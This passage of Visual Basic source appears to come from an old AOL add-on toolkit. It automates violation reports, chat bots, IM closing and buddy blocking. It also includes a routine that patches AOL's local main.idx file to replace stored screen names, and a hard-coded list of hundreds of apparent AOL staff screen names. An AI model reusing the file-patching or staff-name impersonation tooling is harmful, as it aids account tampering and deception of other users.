VioTime% = GetWindow(FindChildByTitle(VVIM%, "Time AM/PM"), GW_HWNDNEXT)
VioMess% = GetWindow(FindChildByTitle(VVIM%, "CUT and PASTE a copy of the IM here"), GW_HWNDNEXT)
Randomize Timer
CurTime$ = gettime()
Call setedit(VioDate%, Date)
Call setedit(VioTime%, CurTime$)
Call setedit(VioMess%, who + ":" + Chr$(9) + Phrase)
sends% = FindChildByTitle(VVIM%, "Send")
click sends%
Call waitforok
Call closewin(help%)
Call closewin(RAV%)
End Sub


Sub ResetSN(SN$, aoldir$, Replace$)
l0036 = Len(SN$)
Select Case l0036
Case 3
i = SN$ + "       "
Case 4
i = SN$ + "      "
Case 5
i = SN$ + "     "
Case 6
i = SN$ + "    "
Case 7
i = SN$ + "   "
Case 8
i = SN$ + "  "
Case 9
i = SN$ + " "
Case 10
i = SN$
End Select
l0036 = Len(Replace$)
Select Case l0036
Case 3
Replace$ = Replace$ + "       "
Case 4
Replace$ = Replace$ + "      "
Case 5
Replace$ = Replace$ + "     "
Case 6
Replace$ = Replace$ + "    "
Case 7
Replace$ = Replace$ + "   "
Case 8
Replace$ = Replace$ + "  "
Case 9
Replace$ = Replace$ + " "
Case 10
Replace$ = Replace$
End Select
X = 1
Do Until 2 > 3
text$ = ""
DoEvents
On Error Resume Next
Open aoldir$ + "\idb\main.idx" For Binary As #1
If Err Then Exit Sub
text$ = String(32000, 0)
Get #1, X, text$
Close #1
Open aoldir$ + "\idb\main.idx" For Binary As #2
Where1 = InStr(1, text$, i, 1)
If Where1 Then
Mid(text$, Where1) = Replace$
ReplaceX$ = Replace$
Put #2, X + Where1 - 1, ReplaceX$
401:
DoEvents
Where2 = InStr(1, text$, i, 1)
If Where2 Then
Mid(text$, Where2) = Replace$
Put #2, X + Where2 - 1, ReplaceX$
GoTo 401
End If
End If
X = X + 32000
LF2 = LOF(2)
Close #2
If X > LF2 Then GoTo 301
Loop
301:
End Sub


Sub OH_Names(List As ListBox)
List.AddItem "AAC2Teach"
List.AddItem "AAC2tor4u"
List.AddItem "AACAcctLiz"
List.AddItem "AACAdJohn"
List.AddItem "AACAlgebra"
List.AddItem "AACAnimTch"
List.AddItem "AACAPTch"
List.AddItem "AACArchTek"
List.AddItem "AACArtArt"
List.AddItem "AACAskBio"
List.AddItem "AACBackDoc"
List.AddItem "AACBikeRPh"
List.AddItem "AACBioAgnt"
List.AddItem "AACBioBug"
List.AddItem "AACBioGS3"
List.AddItem "AACBioHous"
List.AddItem "AACBioHut"
List.AddItem "AACBioKen"
List.AddItem "AACBioLyn"
List.AddItem "AACBioMo"
List.AddItem "AACBioSci"
List.AddItem "AACBioSign"
List.AddItem "AACBioTch"
List.AddItem "AACBioTch1"
List.AddItem "AACBioTM"
List.AddItem "AACBioTutr"
List.AddItem "AACBioWhiz"
List.AddItem "AACBizSam"
List.AddItem "AACBusEd"
List.AddItem "AACCharis"
List.AddItem "AACChemAu"
List.AddItem "AACChemCE"
List.AddItem "AACChemDAS"
List.AddItem "AACChemDr"
List.AddItem "AACChemMan"
List.AddItem "AACChemPhy"
List.AddItem "AACChmA1A"
List.AddItem "AACChmAmi"
List.AddItem "AACChmDrT"
List.AddItem "AACChmH2O"
List.AddItem "AACChmHLM"
List.AddItem "AACChmInst"
List.AddItem "AACChmProf"
List.AddItem "AACChmSci"
List.AddItem "AACChmTigr"
List.AddItem "AACChmTony"
List.AddItem "AACLDTeac"
List.AddItem "AACmsAlina"
List.AddItem "AACCoachB"
List.AddItem "AACCoachK"
List.AddItem "AACCoachPK"
List.AddItem "AACCoachT"
List.AddItem "AACCompute"
List.AddItem "AACCplTim"
List.AddItem "AACCrimLaw"
List.AddItem "AACDaveTch"
List.AddItem "AACDocChem"
List.AddItem "AACDocHist"
List.AddItem "AACDocRob"
List.AddItem "AACDr1abd"
List.AddItem "AACDr57M"
List.AddItem "AACDr7Fe"
List.AddItem "AACDrAce"
List.AddItem "AACDrAlchm"
List.AddItem "AACDrAnP"
List.AddItem "AACDrAsh"
List.AddItem "AACDrAsha1"
List.AddItem "AACDrAVIMA"
List.AddItem "AACDrAVL"
List.AddItem "AACDrAvo"
List.AddItem "AACDrBach"
List.AddItem "AACDrBart"
List.AddItem "AACDrBert"
List.AddItem "AACDrBeth"
List.AddItem "AACDrBob"
List.AddItem "AACDrBones"
List.AddItem "AACDrBwulf"
List.AddItem "AACDrChris"
List.AddItem "AACDrCnnea"
List.AddItem "AACDrDan"
List.AddItem "AACDrDar"
List.AddItem "AACDrDave"
List.AddItem "AACDrDavid"
List.AddItem "AACDrDay"
List.AddItem "AACDrDC"
List.AddItem "AACDrDenis"
List.AddItem "AACDrDJ"
List.AddItem "AACDrDLC"
List.AddItem "AACDrDlfin"
List.AddItem "AACDrDoe"
List.AddItem "AACDrdoole"
List.AddItem "AACDrDunm"
List.AddItem "AACDrE"
List.AddItem "AACDrEl"
List.AddItem "AACDrFizik"
List.AddItem "AACDrFloc"
List.AddItem "AACDrFrank"
List.AddItem "AACDrGee"
List.AddItem "AACDrGenet"
List.AddItem "AACDrGramr"
List.AddItem "AACDrGriff"
List.AddItem "AACDrGV"
List.AddItem "AACDrHuman"
List.AddItem "AACDrIG"
List.AddItem "AACDrIon"
List.AddItem "AACDrJefef"
List.AddItem "AACDrJLH"
List.AddItem "AACDrJoe"
List.AddItem "AACDrJohn"
List.AddItem "AACDrJosh"
List.AddItem "AACDrJWM"
List.AddItem "AACDrKaye"
List.AddItem "AACDrKenn"
List.AddItem "AACDrKstrl"
List.AddItem "AACDrLatin"
List.AddItem "AACDrLgl"
List.AddItem "AACDrLee"
List.AddItem "AACDrLew"
List.AddItem "AACDrLit"
List.AddItem "AACDrLit56"
List.AddItem "AACDrLucie"
List.AddItem "AACDrLynne"
List.AddItem "AACDrMac"
List.AddItem "AACDrMark"
List.AddItem "AACDrMath"
List.AddItem "AACDrMills"
List.AddItem "AACDrMoon"
List.AddItem "AACDrMrsC"
List.AddItem "AACDrNeale"
List.AddItem "AACDrOBGYN"
List.AddItem "AACDrOtter"
List.AddItem "AACDrPaul"
List.AddItem "AACDrPDK"
List.AddItem "AACDrPDLaw"
List.AddItem "AACDrPepr"
List.AddItem "AACDrPel"
List.AddItem "AACDrPG"
List.AddItem "AACDrPhil"
List.AddItem "AACDrPhrog"
List.AddItem "AACDrphysk"
List.AddItem "AACDrPsych"
List.AddItem "AACDrRam"
List.AddItem "AACDrRaven"
List.AddItem "AACDrRealE"
List.AddItem "AACDrRedox"
List.AddItem "AACDrReid"
List.AddItem "AACDrRGBiv"
List.AddItem "AACDrRR"
List.AddItem "AACDrRxn"
List.AddItem "AACDrSailr"
List.AddItem "AACDrShel"
List.AddItem "AACDrShrmp"
List.AddItem "AACDrSid"
List.AddItem "AACDrSmall"
List.AddItem "AACDrSpine"
List.AddItem "AACDrSport"
List.AddItem "AACDrSSH"
List.AddItem "AACDrStars"
List.AddItem "AACDrSteph"
List.AddItem "AACDrTerry"
List.AddItem "AACDrTime"
List.AddItem "AACDrToad"
List.AddItem "AACDrTodd"
List.AddItem "AACDrTomm"
List.AddItem "AACDrTomDC"
List.AddItem "AACDrTrig"
List.AddItem "AACDrVadya"
List.AddItem "AACDrWade"
List.AddItem "AACDrWilb"
List.AddItem "AACDrWS"
List.AddItem "AACEdadmin"
List.AddItem "AACEdGrace"
List.AddItem "AACEduABC2"
List.AddItem "AACEduBibl"
List.AddItem "AACEduCLS"
List.AddItem "AACEducjed"
List.AddItem "AACEduGA"
List.AddItem "AACEduHaj"
List.AddItem "AACEduJim"
List.AddItem "AACEduJo"
List.AddItem "AACEduKtor"
List.AddItem "AACEduLaur"
List.AddItem "AACEdulin"
List.AddItem "AACEduMsB"
List.AddItem "AACEduRob"
List.AddItem "AACEduRRL"
List.AddItem "AACEduSoar"
List.AddItem "AACEduSuzy"
List.AddItem "AACEduWolf"
List.AddItem "AACEERJV"
List.AddItem "AACEgrDave"
List.AddItem "AACEng1"
List.AddItem "AACEngAppl"
List.AddItem "AACEngBarr"
List.AddItem "AACEngBoni"
List.AddItem "AACEngBry"
List.AddItem "AACEngBus"
List.AddItem "AACEngckk"
List.AddItem "AACEngDjm"
List.AddItem "AACEngFun"
List.AddItem "AACEngElf"
List.AddItem "AACEngGuru"
List.AddItem "AACEngJch"
List.AddItem "AACEngJrnT"
List.AddItem "AACEngKat"
List.AddItem "AACEnglcom"
List.AddItem "AACEngLit"
List.AddItem "AACEngNuke"
List.AddItem "AACEngPat"
List.AddItem "AACEngPen"
List.AddItem "AACEngPSD"
List.AddItem "AACEngSoni"
List.AddItem "AACEngStar"
List.AddItem "AACEngTchr"
List.AddItem "AACEngThom"
List.AddItem "AACEngTutr"
List.AddItem "AACEngZuZu"
List.AddItem "AACeyedoc"
List.AddItem "AACFamDoc"
List.AddItem "AACFrchSpa"
List.AddItem "AACFrenchT"
List.AddItem "AACFrHisto"
List.AddItem "AACFrnEng"
List.AddItem "AACFrogTch"
List.AddItem "AACGailRN"
List.AddItem "AACGaSciGy"
List.AddItem "AACGasLaw"
List.AddItem "AACGerEng"
List.AddItem "AACHal"
List.AddItem "AACHistARB"
List.AddItem "AACHistBrM"
List.AddItem "AACHistGuy"
List.AddItem "AACHistIra"
List.AddItem "AACHistJen"
List.AddItem "AACHistLa"
List.AddItem "AACHistMed"
List.AddItem "AACHistMrM"
List.AddItem "AACHstMOPA"
List.AddItem "AACHistNat"
List.AddItem "AACHistNY"
List.AddItem "AACHistTch"
List.AddItem "AACHistTes"
List.AddItem "AACHlthPE"
List.AddItem "AACHostKNG"
List.AddItem "AACHstRoss"
List.AddItem "AACiainPhD"
List.AddItem "AACInstCat"
List.AddItem "AACInstCSA"
List.AddItem "AACInstDan"
List.AddItem "AACInstGrn"
List.AddItem "AACInstKim"
List.AddItem "AACInstrJo"
List.AddItem "AACInstRCR"
List.AddItem "AACInstrJC"
List.AddItem "AACInstrKR"
List.AddItem "AACInstrRN"
List.AddItem "AACITEach"
List.AddItem "AACJan"
List.AddItem "AACJonTch"
List.AddItem "AACJournJm"
List.AddItem "AACJrnProf"
List.AddItem "AACjtTeach"
List.AddItem "AACJudeTch"
List.AddItem "AACKKEduc"
List.AddItem "AACLangDoc"
List.AddItem "AACLATchr"
List.AddItem "AACLawHist"
List.AddItem "AACLawLiz"
List.AddItem "AACLawTech"
List.AddItem "AACLitDoc"
List.AddItem "AACLitDot"
List.AddItem "AACLitLady"
List.AddItem "AACLitTc"
List.AddItem "AACLPNLisa"
List.AddItem "AACLv2Tch"
List.AddItem "AACMacTchr"
List.AddItem "AACMatDust"
List.AddItem "AACMath121"
List.AddItem "AACMath135"
List.AddItem "AACMath314"
List.AddItem "AACMath952"
List.AddItem "AACMathAL"
List.AddItem "AACMathALH"
List.AddItem "AACMathAmy"
List.AddItem "AACMathBLS"
List.AddItem "AACMathCal"
List.AddItem "AACMathCM"
List.AddItem "AACMathCor"
List.AddItem "AACMathCpt"
List.AddItem "AACMathCTW"
List.AddItem "AACMathFrn"
List.AddItem "AACMathJaZ"
List.AddItem "AACMathJC"
List.AddItem "AACMathJEL"
List.AddItem "AACMathJer"
List.AddItem "AACMathJF"
List.AddItem "AACMathJJ"
List.AddItem "AACMathJoe"
List.AddItem "AACMathJR"
List.AddItem "AACMathKar"
List.AddItem "AACMathLDW"
List.AddItem "AACMathLrn"
List.AddItem "AACMathMan"
List.AddItem "AACMathMat"
List.AddItem "AACMathMax"
List.AddItem "AACMathMD7"
List.AddItem "AACMathme"
List.AddItem "AACMathMJ"
List.AddItem "AACMathMJF"
List.AddItem "AACMathMO"
List.AddItem "AACMathMom"
List.AddItem "AACMathMoo"
List.AddItem "AACMathMRS"
List.AddItem "AACMathPKA"
List.AddItem "AACMathRbk"
List.AddItem "AACMathRon"
List.AddItem "AACMathRox"
List.AddItem "AACMathSal"
List.AddItem "AACMathSAW"
List.AddItem "AACMathSCM"
List.AddItem "AACMathSeb"
List.AddItem "AACMathSHS"
List.AddItem "AACMathSte"
List.AddItem "AACMathStu"
List.AddItem "AACMathSue"
List.AddItem "AACMathSV"
List.AddItem "AACMathTam"
List.AddItem "AACMathTch"
List.AddItem "AACMathTF4"
List.AddItem "AACMathTom"
List.AddItem "AACMathVan"
List.AddItem "AACMathVIR"
List.AddItem "AACMathWhz"
List.AddItem "AACMathWiz"
List.AddItem "AACMathWWM"
List.AddItem "AACMaxx"
List.AddItem "AACMBPeach"
List.AddItem "AACmecheng"
List.AddItem "AACMedCCRN"
List.AddItem "AACMedEmer"
List.AddItem "AACMedicPS"
List.AddItem "AACMedSci"
List.AddItem "AACMissA"
List.AddItem "AACMissAng"
List.AddItem "AACMissAmy"
List.AddItem "AACMissB"
List.AddItem "AACMissCyn"
List.AddItem "AACMissDy"
List.AddItem "AACMissH"
List.AddItem "AACMissKMB"
List.AddItem "AACMissLiz"
List.AddItem "AACMissP"
List.AddItem "AACMissT"
List.AddItem "AACMizMath"
List.AddItem "AACMR"
List.AddItem "AACMr1234"
List.AddItem "AACMrABC"
List.AddItem "AACMrAcct"
List.AddItem "AACMrAid"
List.AddItem "AACMrAIKO"
List.AddItem "AACMrAJPC"
List.AddItem "AACMrAlan"
List.AddItem "AACMrAlgem"
List.AddItem "AACMrAllen"
List.AddItem "AACMrAuto"
List.AddItem "AACMrAvion"
List.AddItem "AACMrB"
List.AddItem "AACMrBill"
List.AddItem "AACMrBill2"
List.AddItem "AACMrBrdge"
List.AddItem "AACMrC"
List.AddItem "AACMrCarey"
List.AddItem "AACMrCEng"
List.AddItem "AACMrCFB"
List.AddItem "AACMrChE"
List.AddItem "AACMrChris"
List.AddItem "AACMrCoach"
List.AddItem "AACMrCoop"
List.AddItem "AACMrCPA"
List.AddItem "AACMrCring"
List.AddItem "AACMrDavis"
List.AddItem "AACMrDrama"
List.AddItem "AACMrDW"
List.AddItem "AACMrE2Me"
List.AddItem "AACMrEarth"
List.AddItem "AACMrEMTP"
List.AddItem "AACMrFable"
List.AddItem "AACMrFlopy"
List.AddItem "AACMrFlwrs"
List.AddItem "AACMrFourB"
List.AddItem "AACMrGon"
List.AddItem "AACMrGov"
List.AddItem "AACMrGreg"
List.AddItem "AACMrGrow"
List.AddItem "AACMrH"
List.AddItem "AACMrHargi"
List.AddItem "AACMrHavoc"
List.AddItem "AACMrHeath"
List.AddItem "AACMrHNTR"
List.AddItem "AACMrHnttn"
List.AddItem "AACMrHunt"
List.AddItem "AACMrHyde"
List.AddItem "AACMrJames"
List.AddItem "AACMrJchem"
List.AddItem "AACMrJeff"
List.AddItem "AACMrJimbo"
List.AddItem "AACMrJNW"
List.AddItem "AACMrJohn"
List.AddItem "AACMrJtx"
List.AddItem "AACMrKCB"
List.AddItem "AACMrKD"
List.AddItem "AACMrKitt"
List.AddItem "AACMrKEW"
List.AddItem "AACMrKPD"
List.AddItem "AACMrL"
List.AddItem "AACMrLewis"
List.AddItem "AACMrLwPrf"
List.AddItem "AACMrM"
List.AddItem "AACMrMac"
List.AddItem "AACMrMagic"
List.AddItem "AACMrMarco"
List.AddItem "AACMrMath3"
List.AddItem "AACMrMathX"
List.AddItem "AACMrMathZ"
List.AddItem "AACMrMaze"
List.AddItem "AACMrMike"
List.AddItem "AACMrNozit"
List.AddItem "AACMrPhiby"
List.AddItem "AACMrPhrm"
List.AddItem "AACMrRay"
List.AddItem "AACMrRibs"
List.AddItem "AACMrRog"
List.AddItem "AACMrSal"
List.AddItem "AACMrScott"
List.AddItem "AACMrShaun"
List.AddItem "AACMrSirC"
List.AddItem "AACMrSky10"
List.AddItem "AACMrSpark"
List.AddItem "AACMrSpear"
List.AddItem "AACMrSteve"
List.AddItem "AACMrTBear"
List.AddItem "AACMrTeach"
List.AddItem "AACMrTiff"
List.AddItem "AACMrTJ"
List.AddItem "AACMrTony"
List.AddItem "AACMrUne"
List.AddItem "AACMrUno"
List.AddItem "AACMrV"
List.AddItem "AACMrVideo"
List.AddItem "AACMrXpert"
List.AddItem "AACMrZee"
List.AddItem "AACMrsA"
List.AddItem "AACMrsAlg"
List.AddItem "AACMrsAsk"
List.AddItem "AACMrsAtom"
List.AddItem "AACMrsBell"
List.AddItem "AACMrsBP"
List.AddItem "AACMrsD"
List.AddItem "AACMrsDee"
List.AddItem "AACMrsF"
List.AddItem "AACMrsH"
List.AddItem "AACMrsHart"
List.AddItem "AACMrsK"
List.AddItem "AACMrsLC"
List.AddItem "AACMrsM"
List.AddItem "AACMrsMac"
List.AddItem "AACMrsMath"
List.AddItem "AACMrsMJB"
List.AddItem "AACMrsN"
List.AddItem "AACMrsO"
List.AddItem "AACMrsP"
List.AddItem "AACMrsSal"
List.AddItem "AACMrsSul"
List.AddItem "AACMrsWolf"
List.AddItem "AACMsAct"
List.AddItem "AACMsAllen"
List.AddItem "AACMsAly"
List.AddItem "AACMsAnn"
List.AddItem "AACMsAnnie"
List.AddItem "AACMsanser"
List.AddItem "AACMsApple"
List.AddItem "AACMsAriel"
List.AddItem "AACMsBama"
List.AddItem "AACMsBasic"
List.AddItem "AACMsBean"
List.AddItem "AACMsBeata"
List.AddItem "AACMsBelle"
List.AddItem "AACMsBEngl"
List.AddItem "AACMsBook"
List.AddItem "AACMsBrava"
List.AddItem "AACMsBryte"
List.AddItem "AACMsCaEng"
List.AddItem "AACMsChief"
List.AddItem "AACMsCMF"
List.AddItem "AACMsCoop"
List.AddItem "AACMsCount"
List.AddItem "AACMsDarci"
List.AddItem "AACMsDawn"
List.AddItem "AACMsDebi"
List.AddItem "AACMsDee"
List.AddItem "AACMsdenis"
List.AddItem "AACMsDiana"
List.AddItem "AACMsDonna"
List.AddItem "AACMsDraya"
List.AddItem "AACMsEdFun"
List.AddItem "AACMsElisa"
List.AddItem "AACMsErase"
List.AddItem "AACMsEsq"
List.AddItem "AACMsEssie"
List.AddItem "AACMsFink"
List.AddItem "AACMsGEng"
List.AddItem "AACMsGlobe"
List.AddItem "AACMsGlyph"
List.AddItem "AACMsGramr"
List.AddItem "AACMsGreen"
List.AddItem "AACMsHist"
List.AddItem "AACMsHMW"
List.AddItem "AACMsHolly"
List.AddItem "AACMsHstry"
List.AddItem "AACMsInfo"
List.AddItem "AACMsJacki"
List.AddItem "AACMsJaime"
List.AddItem "AACMsJapan"
List.AddItem "AACMsJayne"
List.AddItem "AACMsJeane"
List.AddItem "AACMsJenny"
List.AddItem "AACMsJill"
List.AddItem "AACMsJoJo"
List.AddItem "AACMsJulia"
List.AddItem "AACMsKaren"
List.AddItem "AACMsKat"
List.AddItem "AACMsKathy"
List.AddItem "AACMsKell"
List.AddItem "AACMsKiddy"
List.AddItem "AACMsKris"
List.AddItem "AACMsL"
List.AddItem "AACMsLaLib"
List.AddItem "AACMsLeigh"
List.AddItem "AACMsLinda"
List.AddItem "AACMsLinde"
List.AddItem "AACMsLogic"
List.AddItem "AACMsLuAnn"
List.AddItem "AACMsLyann"
List.AddItem "AACMsMac"
List.AddItem "AACMsMagik"
List.AddItem "AACMsMAK"
List.AddItem "AACMsMarci"
List.AddItem "AACMsMath"
List.AddItem "AACMsMentr"
List.AddItem "AACMsMex"
List.AddItem "AACMsMolly"
List.AddItem "AACMsNavy"
List.AddItem "AACMsNibbs"
List.AddItem "AACMsNoun"
List.AddItem "AACMsNRSJD"
List.AddItem "AACMsOD"
List.AddItem "AACMsPatti"
List.AddItem "AACMsPeggy"
List.AddItem "AACMsPiano"
List.AddItem "AACMsPrue"
List.AddItem "AACMsQnA"
List.AddItem "AACMsQuilt"
List.AddItem "AACMsR"
List.AddItem "AACMsRach"
List.AddItem "AACMsRenel"
List.AddItem "AACMsRes"
List.AddItem "AACMsRiza"
List.AddItem "AACMsRobin"
List.AddItem "AACMsRobyn"
List.AddItem "AACMsRomy"
List.AddItem "AACMsRusso"
List.AddItem "AACMsSatyr"
List.AddItem "AACMsShan"
List.AddItem "AACMsShawn"
List.AddItem "AACMsShock"
List.AddItem "AACMsStar"
List.AddItem "AACMsSteff"
List.AddItem "AACMsSudie"
List.AddItem "AACMsSue"
List.AddItem "AACMsSusie"
List.AddItem "AACMsTake"
List.AddItem "AACMsTalia"
List.AddItem "AACMsTaran"
List.AddItem "AACMsTB"
List.AddItem "AACMsTch4"
List.AddItem "AACMsTeri"
List.AddItem "AACMsTexas"
List.AddItem "AACMsTutor"
List.AddItem "AACMsTwnkl"
List.AddItem "AACMsTyler"
List.AddItem "AACMsVBMth"
List.AddItem "AACMsVern"
List.AddItem "AACMsVicki"
List.AddItem "AACMsVin"
List.AddItem "AACMsViv"
List.AddItem "AACMsW"
List.AddItem "AACMsWendy"
List.AddItem "AACMsZBear"
List.AddItem "AACMthFire"
List.AddItem "AACMthGeni"
List.AddItem "AACMthNmbr"
List.AddItem "AACMthNorm"
List.AddItem "AACMthSci"
List.AddItem "AACMthStew"
List.AddItem "AACMthTchr"
List.AddItem "AACMthwiz"
List.AddItem "AACMusTch"
List.AddItem "AACMxCrsty"
List.AddItem "AACMythTch"
List.AddItem "AACMzArts"
List.AddItem "AACMzBiz"
List.AddItem "AACMzBusyB"
List.AddItem "AACMzCS"
List.AddItem "AACMzDark"
List.AddItem "AACMzDonna"
List.AddItem "AACMzEng"
List.AddItem "AACMzFriz"
List.AddItem "AACMzGayle"
List.AddItem "AACMzKitty"
List.AddItem "AACMzKori"
List.AddItem "AACMzLacy"
List.AddItem "AACMzLinda"
List.AddItem "AACMzLynda"
List.AddItem "AACMzMacak"
List.AddItem "AACMzMandy"
List.AddItem "AACMzMarcy"
List.AddItem "AACMzMaxRN"
List.AddItem "AACMzOracl"
List.AddItem "AACMzPeggy"
List.AddItem "AACMzShell"
List.AddItem "AACMzShirl"
List.AddItem "AACMzSook"
List.AddItem "AACMzTique"
List.AddItem "AACmzWords"
List.AddItem "AACMzZelda"
List.AddItem "AACNo1Tchr"
List.AddItem "AACnursED"
List.AddItem "AACPACJer"
List.AddItem "AACPat"
List.AddItem "AACPDnvp"
List.AddItem "AACPEJan"
List.AddItem "AACPfKiron"
List.AddItem "AACPfrMich"
List.AddItem "AACPfSpeare"
List.AddItem "AACPgrJoan"
List.AddItem "AACPhyBohr"
List.AddItem "AACPhyDan"
List.AddItem "AACPhyMri"
List.AddItem "AACPhysics"
List.AddItem "AACPhyTch"
List.AddItem "AACPolska"
List.AddItem "AACPolTchr"
List.AddItem "AACPrf1Bob"
List.AddItem "AACPrf2U"
List.AddItem "AACPrf4Man"
List.AddItem "AACPrfAbby"
List.AddItem "AACPrfAlg"
List.AddItem "AACPrfArch"
List.AddItem "AACPrfARed"
List.AddItem "AACPrfASK"
List.AddItem "AACPrfB"
List.AddItem "AACPrfBank"
List.AddItem "AACPrfBear"
List.AddItem "AACPrfBeth"
List.AddItem "AACPrfBib"
List.AddItem "AACPrfBJ"
List.AddItem "AACPrfBma"
List.AddItem "AACPrfBob"
List.AddItem "AACPrfBTur"
List.AddItem "AACPrfCarl"
List.AddItem "AACPrfCase"
List.AddItem "AACPrfCBB"
List.AddItem "AACPrfComp"
List.AddItem "AACPrfCris"
List.AddItem "AACPrfCrow"
List.AddItem "AACPrfDave"
List.AddItem "AACPrfDick"
List.AddItem "AACPrfDooz"
List.AddItem "AACPrfDoug"
List.AddItem "AACPrfDune"
List.AddItem "AACPrfDyn"
List.AddItem "AACPrfEVal"
List.AddItem "AACPrfFair"
List.AddItem "AACPrfFin"
List.AddItem "AACPrfFrch"
List.AddItem "AACPrfFrog"
List.AddItem "AACPrfGdss"
List.AddItem "AACPrfGene"
List.AddItem "AACPrfGeo"
List.AddItem "AACPrfGkni"
List.AddItem "AACPrfHola"
List.AddItem "AACPrfIsis"
List.AddItem "AACPrfJake"
List.AddItem "AACPrfJEI"
List.AddItem "AACPrfJohn"
List.AddItem "AACPrfJoni"
List.AddItem "AACPrfKate"
List.AddItem "AACPrfKath"
List.AddItem "AACPrfKirk"
List.AddItem "AACPrfknow"
List.AddItem "AACPrfLang"
List.AddItem "AACPrfLudw"
List.AddItem "AACPrfM"
List.AddItem "AACPrfMack"
List.AddItem "AACPrfMark"
List.AddItem "AACPrfMath"
List.AddItem "AACPrfMatt"
List.AddItem "AACPrfMdv"
List.AddItem "AACPrfMead"
List.AddItem "AACPrfMel"
List.AddItem "AACPrfMess"
List.AddItem "AACPrfMich"
List.AddItem "AACPrfMike"
List.AddItem "AACPrfMomm"
List.AddItem "AACPrfMore"
List.AddItem "AACPrfMyst"
List.AddItem "AACPrfNeil"
List.AddItem "AACPrfPH"
List.AddItem "AACPrfPhil"
List.AddItem "AACPrfPlus"
List.AddItem "AACPrfPolo"
List.AddItem "AACPrfprps"
List.AddItem "AACPrfRagu"
List.AddItem "AACPrfRain"
List.AddItem "AACPrfSpan"
End Sub
Function ListToList(Source, Destination)
counts = SendMessage(Source, LB_GETCOUNT, 0, 0)

For Adding = 0 To counts - 1
Buffer$ = String$(250, 0)
getstrings% = SendMessageByString(Source, LB_GETTEXT, Adding, Buffer$)
addstrings% = SendMessageByString(Destination, LB_ADDSTRING, 0, Buffer$)
Next Adding

End Function
Function List_Count(Lst As ListBox)
X = Lst.ListCount
List_Count = X
End Function
Sub List_DeleteText(Lst As ListBox, tex)
For i = 0 To Lst.ListCount
If Lst.List(i) = tex Then Lst.RemoveItem (i)
Next i
End Sub
Sub List_LineDelete(Lst As ListBox, num)
Lst.RemoveItem (num)
End Sub
Sub List_Add(List As ListBox, Txt$)
On Error Resume Next
DoEvents
For X = 0 To List.ListCount - 1
    If UCase$(List.List(X)) = UCase$(Txt$) Then Exit Sub
Next
If Len(Txt$) <> 0 Then List.AddItem Txt$
End Sub
Sub FormFlash(frm As Form)
frm.Show
frm.BackColor = &H0&
Pause (".1")
frm.BackColor = &HFF&
Pause (".1")
frm.BackColor = &HFF0000
Pause (".1")
frm.BackColor = &HFF00&
Pause (".1")
frm.BackColor = &H8080FF
Pause (".1")
frm.BackColor = &HFFFF00
Pause (".1")
frm.BackColor = &H80FF&
Pause (".1")
frm.BackColor = &HC0C0C0
End Sub
Public Sub FortuneBot()
'ie
'1.) in Timer1 tye Call FortuneBot
'2.) make 2 command buttons

'3.) in command1_click type-
'Timer1.enbled = True
'AOLChatSend "Type: /Fortune to get your fortune"
'4.) in command2_click type-
'Timer1.enabled = false
'AOLChatSend "Fortune Bot is now Off!"
FreeProcess
Timer1.interval = 1
On Error Resume Next
Dim last As String
Dim name As String
Dim A As String
Dim n As Integer
Dim X As Integer
DoEvents
A = AOLLastChatLine
last = Len(A)
For X = 1 To last
name = Mid(A, X, 1)
Final = Final & name
If name = ":" Then Exit For
Next X
Final = Left(Final, Len(Final) - 1)
If Final = AOLGetUser Then
Exit Sub
Else
If InStr(A, "/fortune") Then
Randomize
rand = Int((Rnd * 10) + 1)
If rand = 1 Then Call AOLChatsend("" & Final & ", You will win the lottery and spend it all on BEER!")
If rand = 2 Then Call AOLChatsend("" & Final & ", You will kill Steve Case and take over AoL!")
If rand = 3 Then Call AOLChatsend("" & Final & ", You will marry Carmen Electra!")
If rand = 4 Then Call AOLChatsend("" & Final & ", You will DL a PWS and get thousands of bucks charged on your account!")
If rand = 5 Then Call AOLChatsend("" & Final & ", You will end up werking at McDonalds and die a lonely man")
If rand = 6 Then Call AOLChatsend("" & Final & ", You will get a check for ONE MILLION $$ from me! Yeah right!")
If rand = 7 Then Call AOLChatsend("" & Final & ", You will be OWNED by shlep")
If rand = 8 Then Call AOLChatsend("" & Final & ", You will be OWNED by epa")
If rand = 9 Then Call AOLChatsend("" & Final & ", You will get an OH and delete Steve Case's SN!")
If rand = 10 Then Call AOLChatsend("" & Final & ", You will slip on a banana peel in Japan and land on some egg foo yung!")
Call Pause(0.6)
End If
End If
End Sub
Sub AOLAntiPunter()
Do
ANT% = FindChildByTitle(AOLMDI(), "Untitled")
IMRICH% = FindChildByClass(ANT%, "RICHCNTL")
STS% = FindChildByClass(ANT%, "_AOL_Static")
ST% = GetWindow(STS%, GW_HWNDNEXT)
ST% = GetWindow(ST%, GW_HWNDNEXT)
Call AOLSetText(ST%, "SouthPark FINAL - This IM Window Should Remain OPEN.")
mi = ShowWindow(ANT%, SW_MINIMIZE)
DoEvents:
If IMRICH% <> 0 Then
Lab = SendMessageByNum(IMRICH%, WM_CLOSE, 0, 0)
Lab = SendMessageByNum(IMRICH%, WM_CLOSE, 0, 0)
End If
Loop
End Sub
Sub AOLBuddyBLOCK(SN As TextBox)
BUDLIST% = FindChildByTitle(AOLMDI(), "Buddy List Window")
Locat% = FindChildByClass(BUDLIST%, "_AOL_ICON")
IM1% = GetWindow(Locat%, GW_HWNDNEXT)
setup% = GetWindow(IM1%, GW_HWNDNEXT)
AOLIcon (setup%)
Pause (2)
STUPSCRN% = FindChildByTitle(AOLMDI(), AOLGetUser & "'s Buddy Lists")
Creat% = FindChildByClass(STUPSCRN%, "_AOL_ICON")
edit% = GetWindow(Creat%, GW_HWNDNEXT)
Delete% = GetWindow(edit%, GW_HWNDNEXT)
view% = GetWindow(Delete%, GW_HWNDNEXT)
PRCYPREF% = GetWindow(view%, GW_HWNDNEXT)
AOLIcon PRCYPREF%
Pause (1.8)
Call AOLKillWindow(STUPSCRN%)
Pause (2)
PRYVCY% = FindChildByTitle(AOLMDI(), "Privacy Preferences")
DABUT% = FindChildByTitle(PRYVCY%, "Block only those people whose screen names I list")
AOLButton (DABUT%)
DaPERSON% = FindChildByClass(PRYVCY%, "_AOL_EDIT")
Call AOLSetText(DaPERSON%, SN)
Creat% = FindChildByClass(PRYVCY%, "_AOL_ICON")
edit% = GetWindow(Creat%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
